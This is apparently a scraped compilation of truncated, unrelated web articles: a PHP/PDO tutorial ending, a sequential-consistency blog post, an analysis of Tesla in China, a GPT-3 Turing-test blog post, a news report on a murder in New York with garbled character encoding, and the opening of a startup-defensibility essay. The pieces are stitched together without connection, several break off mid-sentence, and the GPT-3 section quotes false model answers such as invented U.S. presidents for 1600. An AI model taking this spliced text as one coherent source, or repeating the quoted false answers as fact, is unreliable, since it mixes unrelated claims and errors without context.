</code></p><h2>Frameworks</h2><p>PHP has a great developer community around it these days and so not only are there a ton of individual libraries to use, but full frameworks that can help make building an app much easier. At Hologram, we use the Slim Framework which has a very simple router for defining our API calls as well as other useful features, like an easy method for adding middleware which comes in handy for authentication and rate limiting code.<br></p><p>Other popular frameworks include Laravel and Symfony.</p><h2>PDO</h2><p>PHP has the best database integration of any language I’ve used and PDO is the cornerstone of that. PDO stands for PHP Database Objects and it is the preferred way to execute your SQL queries.<br></p><p>It includes all the usual functions for running queries and paging through the results. Rows can be returned as PHP associative arrays which means that all columns are properly labelled in the array itself.<br></p><p>The best part is that it supports parameterized queries and automatically sanitizes the inputs for you. This means that you can do something like this:</p><p><code>
    // define $database as a PDO object
    $stmt = $database-&gt;prepare("SELECT * FROM users WHERE id = ?;");
    $result = $stmt-&gt;execute([$idnumber]);
    $rows = $result-&gt;fetchAll();
</code></p><p>PDO will automatically replace that “?” with the value in <em>$idnumber</em> and it will properly escape things to prevent SQL injection attacks for you.</p><p>You can also do cool things like named parameters:</p><p><code>
    // define $database as a PDO object
    $values = ['id' =&gt; 10, 'email' =&gt; 'someemail@hologram.io'];
    $stmt = $database-&gt;prepare('SELECT * FROM users WHERE id = :id AND email = :email;');
    $result = $stmt-&gt;execute($values);
    $rows = $result-&gt;fetchAll();
</code></p><p>In this case, PDO will replace the parameters properly from that array while still sanitizing them.<br></p><p>PDO also exposes all the same interfaces regardless of the underlying database engine. There are of course the occasional SQL differences between engines, but most of the time you simply specify the type of database when you initially connect and then make all the same function calls you would for anything else.<br></p><h2>Phinx</h2><p>Speaking of databases, I want to mention a fantastic third party library we use called Phinx to do all of our database migrations. Anytime we need to make a schema change, we define it entirely using PHP code that Phinx then runs on the database. Migrations look like this:<br></p><p><code>
    $orders = $this-&gt;table('orders');
    $orders-&gt;addColumn('invoice_text', 'string', ['length'=&gt;256, 'default'=&gt;''])
           -&gt;update();
</code></p><p>Check them out at <a href="https://phinx.org/" target="_blank">phinx.org</a></p><h2>Lots of useful built-in functions</h2><p>One final aspect that makes things easier and faster in PHP is all of the great built-in utility functions.<br></p><p>Let’s say you have a result set from a database which would be an array of row arrays. You want to pull the name column from each one. You could of course do this with a map function, which PHP supports as well, but why not do this the easy way:</p><p><code>
$names = array_column($rows, 'name');
</code></p><p>‍<em>‍</em>That’s it. And it’s very fast, as that would all be running in PHP’s C internals.<br></p><p>There are dozens more like that, for everything from doing more array operations to parsing XML to manipulating uploaded files and PHP has great documentation on all of them.<br></p><p>A few useful ones that we like:</p><p><a href="https://www.php.net/manual/en/function.array-chunk" target="_blank"><strong>array_chunk</strong></a><strong> </strong>- Break an array into smaller chunks of any size</p><p><a href="https://www.php.net/manual/en/function.array-unique.php" target="_blank"><strong>array_unique</strong></a><strong> </strong>- Remove all duplicate values from an array</p><p><a href="https://www.php.net/manual/en/class.datetime" target="_blank"><strong>DateTime</strong></a> - A whole class for handling dates that can also parse plain English date descriptions like “midnight first day of next month”</p><p><a href="https://www.php.net/manual/en/function.fpassthru" target="_blank"><strong>fpassthru</strong></a> - Reads a file and sends it right back out to the user</p><p><a href="https://www.php.net/manual/en/function.str-getcsv" target="_blank"><strong>str_getcsv</strong></a> - Part of built-in CSV parsing, this reads a CSV row from a string</p><p><a href="https://www.php.net/manual/en/function.urlencode" target="_blank"><strong>urlencode</strong></a> - URL encode a string</p><p>And don’t forget useful operators like <em>??</em> which allows you to check for index existence in an array while specifying a default value. </p><p><code>
$a = $some_array[$x] ?? 500;
</code></p><h2>Conclusion</h2><div><p>Consider PHP for your projects! It’s better than you think.</p></div><h3>Further Reading</h3><p>Modern PHP by Josh Lockhart (The author of the Slim Framework)</p><p><a href="https://phptherightway.com/">phptherightway.com</a> (Also by Josh Lockhart and Phil Sturgeon)</p></div></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <div><article> <p>If you are a software engineer today concurrency is everywhere.</p> <p>On the front-end it manifests as asynchronous web requests, the backend as service-to-service communication, and in systems programming as SMP and thread safety.</p> <p>With the ubiquity of programming with the 4th dimension in mind it's valuable to expand on the building blocks.</p> <p>One of these blocks comes in the form of consistency models: specific rules which govern concurrent access to shared resources.</p> <p>With a focus on sequential consistency I'd like to show you how this model is used in practice with distributed systems.</p> <h2>Sequential Consistency</h2> <p>A conversation with an ex-colleague and friend, centered around the topic, influenced him to write up a nice explanation of sequential consistency.</p> <p>You can check out that article <a href="http://space.af/blog/2020/07/16/sequential-consistency-described-by-viotti-and-vukolic/">here</a>, I will expand on it a bit.</p> <p>In the article referenced above it's explained that in sequential consistency a processor may view writes of other processors in any interleaving, as long as those interleavings remain in the same order.</p> <p>In short recap:</p> <pre><code>          Proc-1   Proc-2
           W(x)     W(y)
           W(z)


  Valid:  W(x),W(z),W(y)
          W(y),W(x),W(z)
          W(x),W(y),W(z)

Invalid:  W(z),W(x),W(Y)
</code></pre> <p>The invalid interleaving is such due to Proc-1's writes happening out of Proc-1's program order.</p> <h2>Expanding On Sequential Consistency</h2> <p>While the provided definition of sequential consistency is easy to follow for two processors it gets a bit more interesting when we model a distributed system.</p> <p>In our distributed system two processes will be issuing writes to a shared register and two other processes will be observing those writes and then issuing a read.</p> <p>Each process is to obey sequential consistency.</p> <pre><code>          Proc-1      Proc-2
           W(x)        W(y)
           W(z)


 Proc-3 Observes: W(x),W(z),W(y), R() =&gt; y

 Proc-4 Observes: W(y),W(x),W(z), R() =&gt; z
</code></pre> <p>Here we notice that Proc-3 and Proc-4 do not agree on the shared register's value, yet this is legal in sequential consistency.</p> <p>As you can imagine, in practice this is not the desired behavior.</p> <h2>Sequential Consistency In Practice</h2> <p>In order for sequential consistency to be useful in a distributed system another mechanism must be provided to ensure all processes see the <strong>same</strong> interleaving of operations.</p> <p>A slide from Martin Kleppmann's great <a href="https://www.youtube.com/watch?v=D5iCl12MuRw&amp;feature=youtu.be">talk</a> provides one such mechanism.</p> <p><img alt="async writes in sequential system" src="https://www.ldelossa.is/martin-klepmann-sequential-consistency.png"></p> <ol> <li>Martin Kleppmann on “Sequential Consistency versus Linearizability”</li> </ol> <p>This slide shows that all writes are fed through a "transaction processor" to create one consistent interleaving of sequential operations.</p> <p>Due to network delay each processor may "lag" behind, seeing older or newer writes then the others.</p> <p>However each processor will <strong>always</strong> observe a totally ordered sequential list of operations.</p> <p>Therefore per the consistency model:</p> <ul> <li>the second processor may read the N-1 write until the network delivers write N.</li> <li>no processor who has received write N will read write N-1.</li> <li>every process will observe a sequentially consistent total ordered history of operations.</li> </ul> <h2>In Conclusion</h2> <p>In the practice of designing distributed systems sequential consistency requires some mechanism to obtain a consistent read of a shared register across processes.</p> <p>When "sequential consistency" is mentioned in regards to a distributed system what is usually being expressed is the ability for processors to "lag" behind observing changes, but eventually seeing all changes in a well defined total order.</p> <p>A secondary mechanism, whether a dedicated process, vector clocks, or fence id, must be present to enforce that each process sees a totally ordered sequence of events.</p> <hr> <p>edits:</p> <ul> <li>fix on valid sequential interleavings in first example.</li> </ul> </article></div></div></div>]]>

                    <p>Tesla may well be the biggest driver of China’s journey towards technological self-reliance, as the “Tech Cold War” between the U.S. and China deepens. This observation wasn’t obvious to me until I listened (three times) to Elon Musk’s Q&amp;A session at the 2020 World Artificial Intelligence Conference in Shanghai earlier this month.</p><p>【想看<a href="https://interconnected.blog/tesla-china-the-tech-cold-war/#chinese-version-below">中文的读者请点击这里</a>或滚动到本页下方】</p><p>While most of the media coverage focused on<a href="https://venturebeat.com/2020/07/09/elon-musk-says-tesla-is-very-close-to-level-5-autonomous-driving/"> Musk’s bold proclamation</a><a href="https://www.forbes.com/sites/johnkoetsier/2020/07/09/elon-musk-tesla-will-have-level-5-self-driving-cars-this-year/#1cd954a32d1d"> that Tesla is</a><a href="https://futurism.com/elon-musk-tesla-close-level-5-autonomy"> very close to achieving</a> Level-5 autonomous driving capabilities, <strong>the entirety of what he said</strong> during the Q&amp;A has far-reaching implications, technologically and geopolitically.</p><figure><iframe width="612" height="344" src="https://www.youtube.com/embed/Mwe2ABPkZLU?feature=oembed" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></figure><h2 id="local-hire-original-engineering-open-patents">Local Hire, Original Engineering, Open Patents</h2><p>Musk’s Q&amp;A was, first and foremost, an aggressive recruiting pitch for the engineering team that Tesla is building in China. What’s most noteworthy is his emphasis that the Tesla China team will be doing “original engineering”.</p><p>This emphasis is important for three reasons:</p><p><strong>1. Local optimization:</strong> for self-driving to work well, where your engineers are physically located play a surprisingly important role. Musk shared that Tesla’s Autopilot works best in California, because the company’s engineers are mostly in California, thus they can do local optimization most effectively to adapt to the reality in California. The plan is: once self-driving works well in California, the software can be adapted to other locations with varying degrees of further local optimization.</p><p>In order for Tesla's Autopilot to work well in China, it needs a local engineering team capable of what its team is doing in California. Thus, “original engineering” makes perfect product sense if Tesla wants to deliver self-driving cars in China -- a growing electric vehicle market where Tesla is taking a large chunk, according to research by ARK Investment. Beyond the engineering and product rationale, it is also <strong>a killer recruiting pitch for the best and brightest</strong>; no talented engineer wants to spend the day refactoring and adapting someone else’s code.</p><figure><img src="https://interconnected.blog/content/images/2020/07/tesla-china-market-share-1.png" alt="" srcset="https://interconnected.blog/content/images/size/w600/2020/07/tesla-china-market-share-1.png 600w, https://interconnected.blog/content/images/2020/07/tesla-china-market-share-1.png 854w" sizes="(min-width: 720px) 720px"></figure><p><strong>2. Friendlier regulators:</strong> In his Q&amp;A, Musk’s confidence in achieving L5 is tempered by the reality that neither he nor anyone else knows what is the level of safety that must be achieved to convince regulators. Twice as safe as a human driver? 10-times? 100-times? Or in Musk’s words, how many 9’s after 99% is needed? We don’t know.</p><p>Regulators play a decisive role in the pace of self-driving advancement, more so than most other tech sectors. For a regulator to make a judgment on the safety threshold, it’s a combination of hard evidence and political will plus incentives. Assuming we have the same safety evidence, then the Chinese government currently has more appetite to experiment with and invest in AI than the U.S. government. <strong>Thus, Chinese regulators of all levels are more incentivized to say “yes” to things, while their American counterparts are more incentivized to say “no”.</strong> This political will was on full display at this AI conference, where the Party Committee Secretary of Shanghai, <a href="https://en.wikipedia.org/wiki/Li_Qiang">Li Qiang</a>, more or less presided over the entire keynote session, where almost every speaker ritualistically praised his leadership at the beginning of each talk. Li’s presence is a big deal, as Shanghai tries to lead China’s AI future, having lost out on the other tech trend booms to Beijing, Shenzhen, and Hangzhou. Tesla’s China GigaFactory is already located in Shanghai. It’s likely that Tesla will continue to receive more favorable regulatory treatment in Shanghai than in California or anywhere else in the U.S.</p><p><strong>3. Reduced risk of sanctions:</strong> With “original engineering”, Tesla China creates original IP that will not be subjected to future U.S. sanctions. Thus, this approach is effective for recruiting and important for Tesla’s own long-term development. China, in turn, will rightfully have access to the IP generated from Tesla China.</p><p>But what’s more important is that Tesla doesn’t care about patents anyways. In 2014, it decided to open source its entire patent portfolio related to building an electric vehicle. In Musk’s mind, patent protection is an impediment not accelerant to technological advancement. In <a href="https://www.tesla.com/blog/all-our-patent-are-belong-you">his blog post</a> announcing the no-patent decision, he wrote:</p><blockquote><em>“<strong>Technology leadership is not defined by patents</strong>, which history has repeatedly shown to be small protection indeed against a determined competitor, but rather by the <strong>ability of a company to attract and motivate the world’s most talented engineers</strong>. We believe that</em><a href="https://www.tesla.com/about/legal#patent-pledge"><em> applying the open source philosophy to our patents</em></a><em> will strengthen rather than diminish Tesla’s position in this regard.” [Bold emphasis mine]</em></blockquote><p>Tesla is flexing its muscle to attract and motivate the most talented engineers in China. When they do develop the self-driving technology needed for Tesla (and yes, I believe it is a “when” not “if”), chances are all that technology will be open sourced for anyone in China and the world to do the same. <strong>Open source technology</strong>, as the Linux Foundation <a href="https://www.linuxfoundation.org/blog/2020/07/understanding-us-export-controls-with-open-source-projects/">clarified in its whitepaper earlier this month</a>, is <strong>not subjected </strong>to the U.S. government’s various export control restrictions.</p><p>Of course, achieving self-driving is not just an algorithm and software engineering challenge, but also a hardware one. To understand that piece of the puzzle, let’s look at Tesla’s custom-designed Full Self-Driving (FSD) chip in the context of China’s current chip manufacturing capabilities.</p><h2 id="what-is-fsd">What is FSD?</h2><p>Tesla began developing its own <a href="https://en.wikichip.org/wiki/tesla_(car_company)/fsd_chip#SoC">FSD chip</a> in 2016. In 2019, it began volume production and deployed these FSD chips inside Model X, S, and 3. It is an 8-bit chip (not the more powerful 32-bit or 64-bit general purpose chip), in order to satisfy the specific computation needs of a self-driving car but nothing more. Thus far, Samsung manufactures the chips using its 14nm process at its Austin, Texas foundry. A self-driving chip does not have as high a requirement in terms of form factor (or size) as a smartphone or smaller device, thus the 14nm process is sufficient.</p><figure><img src="https://interconnected.blog/content/images/2020/07/tesla_fsd_computer_board-small.jpg" alt="" srcset="https://interconnected.blog/content/images/size/w600/2020/07/tesla_fsd_computer_board-small.jpg 600w, https://interconnected.blog/content/images/2020/07/tesla_fsd_computer_board-small.jpg 745w" sizes="(min-width: 720px) 720px"><figcaption>Tesla FSD board. Source: https://en.wikichip.org/wiki/tesla_(car_company)/fsd_chip#SoC</figcaption></figure><p>The FSD chip is highly optimized to do one particular mathematical operation very efficiently: <a href="https://www.khanacademy.org/math/precalculus/x9e81a4f98389efdf:matrices/x9e81a4f98389efdf:properties-of-matrix-multiplication/a/matrix-multiplication-dimensions"><strong>dot product</strong></a>. It’s how you do matrix multiplications -- an operation that a neural network needs to do many many times, especially for a <a href="https://en.wikipedia.org/wiki/Convolutional_neural_network">convolutional neural network</a>. In order for a self-driving car to “see” what’s going on while driving, it has to do a lot of dot products to compute all the image data gathered from its surrounding, frame by frame, before deciding what to do, if anything. And the car must be able to do this constantly for a long time without overheating or slowing down performance. The FSD’s performance apparently exceeds an Nvidia alternative’s by 21-times, while consuming much less power.</p><p>Each Tesla car is installed with two of these chips to add redundancy and improve decision-making: if the two chips “disagree”, the decision is thrown out and the computer starts a new compute and inference cycle on new data. <strong>Essentially, each Tesla has two “brains” to keep each other honest.</strong></p><h2 id="can-china-make-fsd">Can China Make FSD?</h2><p>As I’ve described in a previous deep dive post, <strong>“</strong><a href="https://interconnected.blog/riscv-china-nightingales/"><strong>RISC-V, China, Nightingales</strong></a><strong>”, </strong>China’s largest chip foundry SMIC does have 14nm capabilities. In fact, SMIC’s co-CEO Liang Mong-song, who is credited with bringing the 14nm capabilities to the foundry, was a TSMC veteran and also instrumental in helping Samsung first achieve its own 14nm process, which is being used to manufacture the FSD chips right now. These chips are <a href="https://en.wikichip.org/wiki/tesla_(car_company)/fsd_chip#SoC">designed based on the ARMv8.0-A</a> instruction set architecture (ISA), which isn’t subject to U.S. sanctions since ARM is a UK company.</p><p>That being said, the <a href="https://www.nytimes.com/2020/07/14/business/huawei-uk-5g.html">UK recently banned Huawei completely</a>, reversing its earlier decision that allowed Huawei to build the “non-core” portions of its 5G network. This decision may signal a stronger willingness by UK regulators to either push out Chinese companies or prevent technologies from going to China, as it moves closer to the U.S. in this Tech Cold War.</p><p>To further muddle the picture, Softbank <a href="https://www.wsj.com/articles/softbank-explores-options-for-chip-designer-arm-holdings-11594672437">who owns ARM is mulling a sale</a> after buying it for $32 billion USD four years ago. Meanwhile, RISC-V, the open source ISA, is not yet mature enough to design a self-driving optimized chip like the FSD</p><p>Needless to say, there are many moving pieces to keep track of. SMIC is facing many challenges as it grows into a world-class chip foundry. It has had trouble acquiring advanced lithography technology from the Dutch company ASML, <a href="https://www.reuters.com/article/us-asml-holding-usa-china-insight/trump-administration-pressed-dutch-hard-to-cancel-china-chip-equipment-sale-sources-idUSKBN1Z50HN">due to pressure from the Trump administration</a>. Without ASML’s technology, SMIC will have a hard time advancing beyond the 14nm process to 7nm or denser processes. It will also have trouble acquiring other EDA tools to scale its production capacity, because the<a href="https://mp.weixin.qq.com/s/7phT1v0G45m87JU6s7W5bA"> dominant suppliers are mostly American</a>. Depending on who you ask, SMIC’s future is still pretty bleak, even with <a href="https://www.cnbc.com/2020/07/16/smic-chinas-biggest-chipmaker-surges-in-shanghai-listing.html">its successful IPO</a> on the Shanghai STAR market.</p><p>But at the end of the day, Tesla needs 14nm capabilities and SMIC has them. In fact, <strong>it would make sense for Tesla to be a customer of China-made chips for its China-made cars</strong>. This arrangement will help Tesla avoid future restrictions if U.S. sanctions widen to include its current chip production in Austin. Producing FSD chips at scale for a high-caliber customer like Tesla will push SMIC to up its game on manufacturing quality and operational efficiencies. Combined with the software advancement in AI from the local engineering team, Tesla can end up giving China’s technology ecosystem quite a boost.</p><h2 id="ambition-and-pragmatism">Ambition and Pragmatism</h2><p>Tesla is not only an ambitious company, it’s also a pragmatic one. <strong>Ambitious pragmatism</strong> is what a company, and I’d argue a country, needs to both survive and thrive. In the last Cold War between the U.S. and U.S.S.R., there was actually a lot of ambitious pragmatism that catalyzed technological advancements, like rocketry, satellites, and the space program. So far, the current conflict between the U.S. and China looks totally …</p></div></section></article></div></div></div>

  <article>
    <p>I’ve been playing around with OpenAI’s new
<a href="https://arxiv.org/abs/2005.14165">GPT-3</a> language model. When I got
beta access, the first thing I wondered was, how human is GPT-3? How
close is it to passing a Turing test?</p>

<h2 id="how-it-works">How It Works</h2>

<p>Let me explain how exactly I’m generating these conversations. GPT-3
is a general language model, trained on a large amount of
uncategorized text from the internet. It isn’t
specific to a conversational format, and it isn’t trained to answer
any specific type of question. The only thing it does is, given some
text, guess what text comes next.</p>

<p>So if we want GPT-3 to generate answers to questions, we need to seed
it with a “prompt”. I’m using this prompt to initialize all of the Q&amp;A
sessions:</p>

<div><div><pre><code>Q: What is human life expectancy in the United States?
A: Human life expectancy in the United States is 78 years.

Q: Who was president of the United States in 1955?
A: Dwight D. Eisenhower was president of the United States in 1955.

Q: What party did he belong to?
A: He belonged to the Republican Party.

Q: Who was president of the United States before George W. Bush?
A: Bill Clinton was president of the United States before George W. Bush.

Q: Who won the World Series in 1995?
A: The Atlanta Braves won the World Series in 1995.
</code></pre></div></div>

<p>This is the default prompt suggested by OpenAI for Q&amp;A, so I’m not
cherrypicking it to prove anything. The point of this prompt is just
to show GPT-3 that we’re doing questions and answers, not to provide
it with information. For the prompt, both questions and answers are provided by a
human. For all the others, the answers are generated by GPT-3.</p>

<h2 id="common-sense">Common Sense</h2>

<p>Traditionally, artificial intelligence struggles at “common sense”. But
GPT-3 can answer a lot of common sense questions.</p>

<div><div><pre><code>Q: What is your favorite animal?
A: My favorite animal is a dog.

Q: Why?
A: Because dogs are loyal and friendly.

Q: What are two reasons that a dog might be in a bad mood?
A: Two reasons that a dog might be in a bad mood are if it is hungry or if it is hot.

Q: How many eyes does a giraffe have?
A: A giraffe has two eyes.

Q: How many legs does a frog have?
A: A frog has four legs.

Q: Are there any animals with three legs?
A: No, there are no animals with three legs.

Q: Why don't animals have three legs?
A: Animals don't have three legs because they would fall over.
</code></pre></div></div>

<p>Ten years ago, if I had this conversation, I would have assumed the
entity on the other end was a human. You can no longer take it for
granted that an AI does not know the answer to “common sense” questions.</p>

<p>How does GPT-3 know that a giraffe have two eyes? I wish I had some
sort of “debug output” to answer that question. I don’t know for sure,
but I can only theorize that there must be some web page in its
training data that discusses how many eyes a giraffe has. If we want
to stump GPT-3 with common sense questions, we need to think of
questions about things so mundane, they will not appear on the internet.</p>

<div><div><pre><code> Q: Which is heavier, a mouse or an elephant?
 A: An elephant is heavier than a mouse.

 Q: Which is heavier, a mouse or a toaster?
 A: A toaster is heavier than a mouse.

 Q: Which is heavier, a toaster or a pencil?
 A: A pencil is heavier than a toaster.

 Q: Which is heavier, a paper clip or a can of soda?
 A: A can of soda is heavier than a paper clip.

 Q: Which is heavier, a football player or a car?
 A: A car is heavier than a football player.
</code></pre></div></div>

<p>It’s only 4/5. We’re closer to stumping GPT-3 here. I think a human
would be pretty close to 100% on these questions. It makes sense these
are trickier - there probably isn’t any web page that compares
toasters and pencils by weight. It’s only indirectly that humans gain
this knowledge.</p>

<p>This gives us a hint for how to stump the AI more consistently. We
need to ask questions that no normal human would ever talk about.</p>

<div><div><pre><code>Q: How many eyes does a giraffe have?
A: A giraffe has two eyes.

Q: How many eyes does my foot have?
A: Your foot has two eyes.

Q: How many eyes does a spider have?
A: A spider has eight eyes.

Q: How many eyes does the sun have?
A: The sun has one eye.

Q: How many eyes does a blade of grass have?
A: A blade of grass has one eye.
</code></pre></div></div>

<p>Now we’re getting into surreal territory. GPT-3 knows how to have a
normal conversation. It doesn’t quite know how to say “Wait a
moment… your question is nonsense.” It also doesn’t know how to say
“I don’t know.”</p>

<div><div><pre><code>Q: How do you sporgle a morgle?
A: You sporgle a morgle by using a sporgle.

Q: How many bonks are in a quoit?
A: There are three bonks in a quoit.

Q: How many rainbows does it take to jump from Hawaii to seventeen?
A: It takes two rainbows to jump from Hawaii to seventeen.

Q: Which colorless green ideas sleep furiously?
A: Ideas that are colorless, green, and sleep furiously are the ideas of a sleep
furiously.

Q: Do you understand these questions?
A: I understand these questions.
</code></pre></div></div>

<p>The lesson here is that if you’re a judge in a Turing test, make sure
you ask some nonsense questions, and see if the interviewee responds
the way a human would.</p>

<h2 id="trivia-questions">Trivia Questions</h2>

<p>GPT-3 is quite good at answering questions about obscure things.</p>

<div><div><pre><code>Q: Who was president of the United States in 1801?
A: Thomas Jefferson was president of the United States in 1801.

Q: What city is in the northwest corner of Ohio?
A: Toledo is in the northwest corner of Ohio.

Q: What highway do you take to get to North Lake Tahoe from Oakland?
A: Highway 80 is the highway you take to get to North Lake Tahoe from Oakland.

Q: What are Darius's abilities in League of Legends?
A: Darius's abilities in League of Legends are: Apprehend, Decimate,
Noxian Guillotine, Crippling Strike, Apprehend, and Hemorrhage.

Q: Who did Capablanca defeat to become world chess champion?
A: Capablanca defeated Lasker to become world chess champion.
</code></pre></div></div>

<p>Oops, a repeat snuck in with question 4, but a human would make that
sort of error too. GPT-3 seems to be above
human-level on this sort of question. The tricky thing for
applications, I think, is to figure out when the answer can be relied
on. The OpenAI API does expose more data than just the text, here, so
perhaps something clever is possible.</p>

<p>In general, if you are trying to distinguish an AI from a human, you
don’t want to ask it obscure trivia questions. GPT-3 is pretty good at
a wide variety of topics.</p>

<p>One trend that continues from the common sense is that GPT-3 is
reluctant to express that it doesn’t know the answer. So invalid
questions get wrong answers.</p>

<div><div><pre><code>Q: Who was president of the United States in 1700?
A: William Penn was president of the United States in 1700.

Q: Who was president of the United States in 1650?
A: Richard Bennett was president of the United States in 1650.

Q: Who was president of the United States in 1620?
A: James I was president of the United States in 1620.

Q: Who was president of the United States in 1600?
A: Queen Elizabeth I was president of the United States in 1600.
</code></pre></div></div>

<p>These wrong answers are actually fascinating! None of these were
presidents of the United States, of course, since the US didn’t exist
then. But they are all prominent political figures who were in charge
of some US-related political entity around that time. In a sense, they
are good guesses.</p>

<div><div><pre><code>Q: Who won the World Series in 2021?
A: The New York Yankees won the World Series in 2021.

Q: Who won the World Series in 2022?
A: The New York Yankees won the World Series in 2022.

Q: Who won the World Series in 2023?
A: The New York Yankees won the World Series in 2023.
</code></pre></div></div>

<p>A bleak view of a dystopian future.</p>

<div><div><pre><code>Q: How many Super Bowls do the Cincinnati Bengals win in the 2030s?
A: The Cincinnati Bengals win two Super Bowls in the 2030s.
</code></pre></div></div>

<p>Encouraging as a Bengals fan, but perhaps not the objectively most accurate
prediction. We’ll have to wait and see.</p>

<h2 id="logic">Logic</h2>

<p>People are used to computers being superhuman at logical activities,
like playing chess or adding numbers. It might come as a surprise that
GPT-3 is not perfect at simple math questions.</p>

<div><div><pre><code>Q: When counting, what number comes before 100?
A: Ninety-nine comes before 100.

Q: When counting, what number comes before 123?
A: One hundred and twenty-two comes before 123.

Q: When counting, what number comes before 1000?
A: Nine hundred and ninety-nine comes before 1000.

Q: When counting, what number comes before 10,000?
A: Nine thousand and ninety-nine comes before 10,000.

Q: When counting, what number comes before a million?
A: Nine hundred thousand and ninety-nine comes before a million.
</code></pre></div></div>

<p>This is where the generic nature of GPT-3 comes into play. It isn’t
just the generic model, though, it’s also the architecture of neural
networks themselves. As far as I know there is no neural network that
is capable of doing basic arithmetic like addition and multiplication
on a large number of digits based on training data rather than
hardcoding.</p>

<p>It’s funny, because these operations are simple for a customized
program. But recursive logic that does some operation and repeats it
several times often doesn’t quite map onto the architecture of a
neural net well.</p>

<p>An interesting corollary is that GPT-3 often finds it easier to write
code to solve a programming problem, than to solve the problem on one
example input:</p>

<div><div><pre><code>Q: Write one line of Ruby code to reverse an array.
A: ary.reverse

Q: Write one line of Ruby code to count how many X's are in an array.
A: ary.count { |x| x == 'X' }

Q: Reverse the following array: [1, 3, 5, 6, 10, 4, 2, 77]
A: [10, 6, 4, 2, 77, 3, 5, 1]

Q: How many X's are in this array: [1, 3, 5, 6, 10, 4, 2, 77]
A: 2
</code></pre></div></div>

<p>This problem shows up in more human questions as well, if you ask
it about the result of a sequence of operations.</p>

<div><div><pre><code>Q: If I have a marble and a paper clip in a box, put a pencil in the box,
and remove the marble, what is left?
A: A paper clip.

Q: If I have two shoes in a box, put a pencil in the box, and
remove one shoe, what is left?
A: A shoe.

Q: If I put a pencil in a box, then put another pencil in the box,
what is in the box?
A: Two pencils.

Q: Then if …</code></pre></div></div></article></div></div></div></div>

<p>There is no information or page for him on Facebook and or Twitter. However, Tyrese Devon Haspil, has been the personal assistant of Fahim for more than four years, according to people who were close to Fahim.</p>
<p>It is not clear if he deliberately deleted all personal information about him on social media before committing the alleged crime.</p>
<p>The personal assistant, Tyrese Devon Haspil, 21, was expected to be charged in a criminal complaint with second degree murder and other crimes.</p>
<p>Detectives believe that the motive for the killing stemmed from Mr. Saleh having discovered that the assistant had stolen tens of thousands of dollars from him, despite the fact that Mr. Saleh had not reported the man and had set up what amounted to a repayment plan for him to return the money, one of the officials said.</p>
<p>The police were expected to announce the arrest at a news conference later Friday.</p>
<p>Investigators have also concluded that Mr. Saleh was killed on Monday, the day before his body was found, and that the killer returned the next day to Mr. Salehâ€™s apartment on East Houston Street to dismember the body and clean up the crime scene.</p>
<p>Detectives believe that the killer, dressed in a black three-piece suit, white shirt and tie, wearing a black mask and carrying a duffle bag, followed Mr. Saleh off an elevator in his building and into his apartment, a law enforcement official said. He used a Taser to immobilize Mr. Saleh and then stabbed him to death.</p>
<p>Security video taken from inside the elevator shows the killer later using a battery-operated portable vacuum cleaner in an apparent effort to remove any traces of his presence, the official said.</p>
<p>New York Cityâ€™s medical examiner announced on Thursday that Mr. Saleh had died from multiple stab wounds to his neck and torso. Initially, a law enforcement official had described the killing as a â€œhitâ€� and said it looked â€œlike a professional job.â€�</p>
<p>Detectives investigating the murder believe the killerâ€™s work dismembering the body was interrupted when Mr. Salehâ€™s sister buzzed from the buildingâ€™s lobby, another official said, prompting him to flee through the apartmentâ€™s back door and into a stairwell before the sister arrived.</p>
<p>Mr. Salehâ€™s family said in a statement on Wednesday that the gruesome killing was so shocking it was unfathomable.</p>
<p>â€œFahim is more than what you are reading,â€� the family said. â€œHe is so much more. His brilliant and innovative mind took everyone who was a part of his world on a journey and he made sure never to leave anyone behind.â€�</p>
<p>Mr. Saleh was born in Saudi Arabia to Bangladeshi parents who eventually settled near Poughkeepsie, N.Y., a small city on the Hudson River.</p>
<p>After graduating from Bentley University in Waltham, Mass., in 2009, he built an app called PrankDial that allowed users to send prerecorded prank calls. Mr. Saleh said he eventually built PrankDial into a $10 million business.</p>
<p>Mr. Saleh went on to found Pathao, a motorcycle ride-sharing start-up in Bangladesh. He left that company in 2018 to begin a similar venture in Nigeria, an app known as Gokada.</p>
<p>At the time of his death, Mr. Saleh was the chief executive of Gokada and oversaw a shift in its business during a turbulent time. In February, Nigerian officials began enforcing a ban on motorcycle taxis in major commercial and residential parts of the countryâ€™s largest city, Lagos.</p>
<p>Gokada was forced to halt its ride-hailing business and laid workers off, but Mr. Saleh pivoted the company to focus on food and parcel delivery and business logistics.</p>
<p>â€œFahimâ€™s passion for Nigeria and its youth was immeasurable,â€� Gokada said in a statement. â€œHe believed young Nigerians were extremely bright and talented individuals who would flourish if just given the right opportunity.â€�</p>
<p>Mr. Saleh was also the founding partner in a Manhattan-based venture capital fund, Adventure Capital, that invested in similar transit start-ups in Colombia and Bangladesh.</p>

            <h2>TL;DR:</h2>
<p>There needs to be a division between the companies depending on whether they posses a competitive advantage (s), unfair advantage (s), or defensibility features. I dare to make three categories:</p>
<ol>
<li>a) Weak, defined by owning only “<strong>competitive advantages</strong>”. Their growth is capped. Highly susceptible to competition. As a result, they may go out of the market in the shortest period.&nbsp; Though they can generate a nice profit during its time-being.</li>
<li>b) Strong, manifest one or more “<strong>unfair advantages</strong>” along with “competitive advantages”. Has a sound standing against other competitors until its unfair advantage (s) is valid. Yet, it is not bulletproof to the competition. Strong companies usually have linear growth, no revenue cap. With proper management, business models/ideas can turn a company into the defensible one.</li>
<li>c) Defensible or Economic Moat. A company dominates the competitive landscape. It can stay profitable for a long time and has the necessary prerequisites for exponential growth. Depending on the sectors of the economy the company operates within, defensibility comes either from owning one or several defensibility features.</li>
</ol>
<p>Specifically, such defensibility features as brand and barriers to entry are very case-specific. In most cases, we cannot regard them as the only factor to build a defensible business. But in connection with the other defensibility factors – their equity multiplies, business growth compounds, turning them in the true Economic Moats.</p>

<h2>Introduction to “Competitive Advantage”, “Unfair Advantage”, and “Defensibility”</h2>
<p>If you looked at key features the startup accelerators (e.g. Y Combinator, AngelPad) or VCs seek in tech companies, then you would notice that «defensibility» is the most popular one. According to the Webster dictionary, it means – «capability of being defended».</p>
<p>To put it simply, defensibility refers to one or several traits of the product that protect it from competitors, copy-cats, analogies. It is a guarantee for the exclusivity of the solution a company offers or promises to deliver that will outperform any other on the market on the long-term time horizon, let’s say 10-15 years at least. Defensibility applies equally to other markets, be it DTC, manufacture, or services.</p>
